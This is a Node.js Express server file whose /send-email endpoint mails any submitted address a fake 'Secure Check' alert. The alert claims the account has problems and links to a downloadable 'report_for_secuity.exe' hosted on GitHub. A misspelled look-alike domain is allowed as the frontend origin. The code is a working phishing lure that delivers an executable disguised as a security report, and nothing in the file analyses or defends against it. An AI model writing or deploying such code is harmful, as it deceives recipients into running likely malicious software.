const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Allow frontend to reach backend
app.use(cors({
  origin: [
    'https://seccureemail.web.app'
  ]
}));

app.use(express.static('public'));

// Use secure environment variables
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

app.post('/send-email', (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.status(400).json({ error: 'Email is required' });
  }

  const mailOptions = {
    from: `"Secure Check" <${process.env.EMAIL_USER}>`,
    to: email,
    subject: 'Your Secure Check Report',
    html: `
      <p>Hi!</p>
      <p>Your email (<strong>${email}</strong>) has been checked. There are several problems in your account. Check the report below.</p>
      <p><a href="https://raw.githubusercontent.com/Ayamet/web/main/main/report_for_secuity.exe" target="_blank">
         Download your security report</a></p>
      <p>Best regards,<br>Secure Check Team</p>
    `
  };

  transporter.sendMail(mailOptions, (err, info) => {
    if (err) {
      console.error('Email error:', err);
      return res.status(500).json({ error: 'Failed to send email' });
    }
    res.json({ success: true });
  });
});

app.listen(PORT, () => {
  console.log(`✅ Server running on PORT ${PORT}`);
});
